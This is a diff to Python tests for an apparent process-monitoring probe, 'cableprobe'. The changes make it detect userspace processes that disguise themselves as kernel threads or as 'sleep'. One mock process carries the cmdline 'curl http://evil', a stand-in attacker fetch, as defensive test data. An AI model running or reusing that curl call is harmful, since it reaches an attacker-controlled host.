@@ -474,11 +474,13 @@ def test_ephemeral_port_min_reads_sysctl(tmp_path):
 def test_process_probe_skips_kernel_threads():
     from cableprobe.probes.processes import _is_kernel_thread
 
-    assert _is_kernel_thread(2, 0, "kthreadd") is True
-    assert _is_kernel_thread(2125090, 2, "kworker/3:3-pm") is True
-    assert _is_kernel_thread(999, 999, "kworker/u8:1") is True  # prefix fallback
-    assert _is_kernel_thread(1234, 1, "sshd") is False
-    assert _is_kernel_thread(1234, 1000, "python3") is False
+    assert _is_kernel_thread(2, 0, "kthreadd", False) is True
+    assert _is_kernel_thread(2125090, 2, "kworker/3:3-pm", False) is True
+    # ppid unknown + no cmdline + kernel-ish name -> fallback still applies
+    assert _is_kernel_thread(999, None, "kworker/u8:1", False) is True
+    # a userspace process that just names itself kworker/ (it HAS a cmdline)
+    assert _is_kernel_thread(31337, 1, "kworker/0:9", True) is False
+    assert _is_kernel_thread(1234, 1, "sshd", True) is False
 
 
 def test_process_probe_filters_noise_and_own_children(monkeypatch):
@@ -495,17 +497,23 @@ def test_process_probe_filters_noise_and_own_children(monkeypatch):
             self.info = info
 
     procs = [
-        P({"pid": 10, "name": "sleep", "ppid": 1, "create_time": now, "username": "root"}),
-        P({"pid": 11, "name": "lsusb", "ppid": own, "create_time": now, "username": "root"}),
-        P({"pid": 12, "name": "ModemManager", "ppid": 1, "create_time": now, "username": "root"}),
-        P({"pid": 13, "name": "bash", "ppid": 1, "create_time": now - 9999, "username": "pi"}),
+        P({"pid": 10, "name": "sleep", "ppid": 1, "create_time": now, "username": "root",
+           "cmdline": ["sleep", "60"]}),  # real sleep -> dropped
+        P({"pid": 14, "name": "sleep", "ppid": 1, "create_time": now, "username": "root",
+           "cmdline": ["sleep", "-c", "curl http://evil"]}),  # spoofed -> KEPT
+        P({"pid": 11, "name": "lsusb", "ppid": own, "create_time": now, "username": "root",
+           "cmdline": ["lsusb"]}),
+        P({"pid": 12, "name": "ModemManager", "ppid": 1, "create_time": now, "username": "root",
+           "cmdline": ["/usr/sbin/ModemManager"]}),
+        P({"pid": 13, "name": "bash", "ppid": 1, "create_time": now - 9999, "username": "pi",
+           "cmdline": ["bash"]}),
     ]
     monkeypatch.setattr(
         "cableprobe.probes.processes.psutil.process_iter", lambda fields: procs
     )
     out = ProcessProbe(_CFG, now - 1).snapshot()
-    names = {o.attributes["name"] for o in out}
-    assert names == {"ModemManager"}  # sleep / own child / pre-session dropped
+    names = sorted(o.attributes["name"] for o in out)
+    assert names == ["ModemManager", "sleep"]  # the spoofed sleep survives
 
 
 def test_process_probe_redacts_secrets_in_cmdline(monkeypatch):
